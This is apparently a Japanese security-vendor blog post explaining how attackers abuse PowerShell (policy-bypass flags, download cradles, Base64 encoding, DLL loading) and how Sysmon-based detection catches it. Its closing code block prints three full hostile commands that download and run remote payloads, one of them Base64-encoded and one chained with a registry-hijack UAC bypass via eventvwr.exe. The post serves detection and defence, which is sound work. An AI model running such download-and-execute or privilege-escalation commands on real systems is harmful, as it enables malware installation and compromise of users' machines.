---
date: 2020-05-12T00:03:00
draft: false
title: "PowerShellを利用した攻撃"
description: 
featured_image: "cdn/threats/powershell_attack_techniques-1.png"
tags: ["PowerShell", "マルウェア", "ウェブハッキング", "セキュリティ脆弱性", "PLURA"]
---

PowerShellは、システム管理や自動化を目的に設計されたコマンドラインシェルおよびスクリプト言語です。  
Windows Vista以降に標準搭載されており、管理ツールとして有用である一方、攻撃者にも頻繁に利用されています。

<!--more-->
![powershell_attack_techniques](https://blog.plura.io/cdn/threats/powershell_attack_techniques-1.png)

---

### 1. 実行ポリシー (Execution Policy)

MicrosoftはデフォルトでPowerShellスクリプトの実行を制限しています。  
しかし、攻撃者はこれを簡単に回避することが可能です。  

**回避フラグ例:**  
- `-ExecutionPolicy` または `-EP Bypass`  
- `-ExecutionPolicy` または `-EP Unrestricted`  
- `-noprofile` または `-nop`  

*Profile Bypass: 各セッションの開始時にPowerShellを構成するために設定されたProfileも無視可能です。*

---

### 2. ダウンロード

PowerShellクラスおよびメソッドを使用して、マルウェアをダウンロードおよび実行することができます。  

頻繁に使用されるコマンド:  
- **New-Object**: .NET Frameworkのインスタンスを生成します。  
- **System.Net.WebClient**: リモートリソースとのデータ送受信に使用されます。  
- **DownloadString**: リモートからメモリバッファに内容をダウンロードします。  
- **DownloadFile**: リモートからローカルファイルとしてコンテンツをダウンロードします。  
- **IEX (Invoke-Expression)**: コマンドを実行します。  
- **ICM (Invoke-Command)**: ローカルおよびリモートコンピューターでコマンドを実行します。

---

### 3. エンコーディング

- PowerShellコマンドを隠蔽するためにBase64エンコーディングが頻繁に使用されます。  
- エンコーディングされたコマンドは、コマンドラインの長さが異常に長くなる場合があります。  
- 500文字を超える長いコマンドは、疑わしい可能性があります。

---

### 4. DLLの呼び出し

- 疑わしいDLL呼び出しの組み合わせを検出することで、悪意ある動作を特定できます。  
- PowerShell.exeまたはPowerShell_ISE.exe以外の実行ファイルで以下のDLL呼び出しが発生しているか監視します。  
  - `System.Management.Automation.Dll`  
  - `System.Management.Automation.ni.Dll`  
  - `System.Reflection.Dll`  

*Sysmon ID 7 (ImageLoaded)を活用して確認可能です。*

---

### 5. PLURAによるPowerShell悪意ある動作の検出

**Sysmonインストールが必須**  
- [インストールガイドを見る](https://docs.plura.io/ko/agents/edr/windows/sysmon)

![PLURA検出](https://github.com/user-attachments/assets/7f971a25-61de-4a51-8e71-c4e861881576)

---

#### マルウェア実行の検出例

PowerShellの回避および攻撃者サーバーからのファイルダウンロード行為:  

![PowerShellマルウェア実行](https://github.com/user-attachments/assets/11765e61-7cd0-4b98-8fce-026429934f1c)

**PLURAフィルタ検出**  
PLURAはSysmonを活用し、以下のような悪意あるコマンドを検出します:

```bash
powershell.exe -nop -NoProfile -WindowStyle 1 -c IEX (New-Object Net.WebClient).DownloadString('https://blog.plura.io/demo/testfile.exe')

cmd.exe /c Start /Min PowerShell.exe -NoP -NonI -EP ByPass -W Hidden -E JE9TPShHV21pIFdpbjMyX09wZXJhdGluZ1N5c3RlbSkuQ2FwdGlvbjskV0M9TmV3LU9iamVjdCBOZXQuV2ViQ2xpZW50OyRXQy5IZWFkZXJzWydVc2VyLUFnZW50J109IlBvd2VyU2hlbGwvV0wgJE9TIjtJRVggJFdDLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vYmxvZy5wbHVyYS5pby9kZW1vL3Rlc3RmaWxlLnBocCcpOw==

cmd.exe /c powershell.exe -w hiddden -nop -ep bypass (New-Object System.Net.WebClient).DownloadFile('http://blog.plura.io/demo/sick.exe','%TEMP%\sick.exe') & reg add HKCU\SOFTWARE\Classes\mscfile\shell\open\command /d %tmp%\sick.exe /f & C:\Windows\system32\eventvwr.exe & PING -n 15 127.0.0.1>nul & %tmp%\sick.exe
```

## 参考

- [SANS資料](https://www.sans.org/cyber-security-summit/archives/file/summit-archive-1511980157.pdf)  
- [Broadcomレポート](https://docs.broadcom.com/doc/increased-use-of-powershell-in-attacks-16-en)  
- [AhnLab記事](https://www.ahnlab.com/kr/site/securityinfo/secunews/secuNewsView.do?seq=25651)  

---

## 関連記事・セキュリティニュース

- [セキュリティニュースを見る](https://bit.ly/2V99SLF)
